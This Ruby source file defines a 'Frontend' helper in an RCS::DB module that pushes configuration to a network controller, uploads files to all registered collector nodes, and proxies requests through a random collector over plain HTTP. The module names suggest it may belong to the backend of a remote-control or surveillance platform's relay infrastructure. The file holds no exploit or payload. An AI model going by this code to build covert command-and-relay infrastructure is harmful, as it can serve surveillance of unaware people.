#
# Helper class to send push notification to the network controller
#

require 'net/http'
require 'rcs-common/trace'

module RCS
module DB

class Frontend
  extend RCS::Tracer

  def self.rnc_push(address)
    begin
      # find a network controller in the status list
      nc = ::Status.where({type: 'nc', status: ::Status::OK}).first

      return false if nc.nil?

      trace :info, "Frontend: Pushing configuration to #{address}"

      # send the push request
      http = Net::HTTP.new(nc.address, 80)
      http.request_put("/RCS-NC_#{address}", '', {})
      
    rescue Exception => e
      trace :error, "Frontend RNC PUSH: #{e.message}"
      return false
    end

    return true
  end

  def self.collector_put(filename, content)
    begin
      raise "no collector found" if ::Status.where({type: 'collector', status: ::Status::OK}).count == 0
      # put the file on every collector, we cannot know where it will be requested
      ::Status.where({type: 'collector', status: ::Status::OK}).all.each do |collector|

        next if collector.address.nil?
        
        trace :info, "Frontend: Putting #{filename} to #{collector.name} (#{collector.address})"

        # send the push request
        http = Net::HTTP.new(collector.address, 80)
        http.request_put("/#{filename}", content, {})

      end
    rescue Exception => e
      trace :error, "Frontend Collector PUT: #{e.message}"
      raise "Cannot put file on collector"
    end
  end


  def self.proxy(method, host, url, content = nil, options = {})
    begin
      raise "no collector found" if ::Status.where({type: 'collector', status: ::Status::OK}).count == 0
      # request to one of the collectors
      collector = ::Status.where({type: 'collector', status: ::Status::OK}).all.sample

      trace :debug, "Frontend: Proxying #{host} #{url} to #{collector.name}"

      # send the push request
      http = Net::HTTP.new(collector.address, 80)
      http.send_request('HEAD', "/#{method}/#{host}#{url}", content, options)

    rescue Exception => e
      trace :error, "Frontend Collector PROXY: #{e.message}"
      raise "Cannot proxy the request"
    end
  end

end

end #DB::
end #RCS::